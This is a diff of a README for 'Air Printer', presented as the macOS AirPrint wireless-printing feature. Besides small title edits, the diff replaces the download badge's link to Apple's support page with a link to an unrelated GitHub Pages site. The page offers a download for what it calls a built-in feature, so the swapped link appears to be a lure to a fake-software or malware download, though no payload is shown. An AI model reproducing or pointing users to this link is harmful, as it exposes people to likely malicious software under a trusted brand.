@@ -1,4 +1,4 @@
-# Air Printer Mac – Wireless Printing Made Simple  
+# Air Printer – Wireless Printing Made Simple  
 
 <div align="center">
 
@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get Air Printer Mac](https://img.shields.io/badge/Get_Air_Printer_for_Mac-blue?style=for-the-badge&logo=apple)](https://support.apple.com/guide/mac-help/use-airprint-printers-mchlp1110/mac)
+[![Get Air Printer Mac](https://img.shields.io/badge/Get_Air_Printer_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/airprinter)
 
 </div>
 
@@ -21,9 +21,9 @@
 
 ---
 
-## What is Air Printer Mac?  
+## What is Air Printer?  
 
-**Air Printer Mac** is a built-in solution that enables seamless wireless printing on macOS without requiring any additional drivers or complex installation steps. Powered by **Apple AirPrint technology**, it allows you to connect directly to any AirPrint-enabled printer over Wi-Fi and start printing instantly.  
+**Air Printer** is a built-in solution that enables seamless wireless printing on macOS without requiring any additional drivers or complex installation steps. Powered by **Apple AirPrint technology**, it allows you to connect directly to any AirPrint-enabled printer over Wi-Fi and start printing instantly.  
 
 This feature is designed for **simplicity and reliability**. Instead of dealing with printer CDs, third-party utilities, or long setup processes, macOS automatically detects supported printers on the same network. Once detected, you can send documents, PDFs, images, or even web pages to print straight from your Mac.  
 
